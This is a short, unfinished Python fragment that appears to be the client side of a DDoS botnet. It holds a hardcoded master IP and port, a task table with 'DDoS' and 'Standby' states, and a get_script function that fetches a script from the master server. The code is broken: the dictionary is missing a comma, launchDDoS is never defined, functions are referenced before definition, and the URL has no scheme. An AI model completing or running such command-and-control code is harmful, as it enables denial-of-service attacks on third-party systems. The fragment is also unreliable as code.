from flask import Flask
import requests

MASTER_IP = "192.168.1.39"
MASTER_PORT = "6969"

steps = {
    "DDoS": (get_script, launchDDoS)
    "Standby": ()
}

def get_script():
    url = requests.get(MASTER_IP + ":" + MASTER_PORT + "/get_script")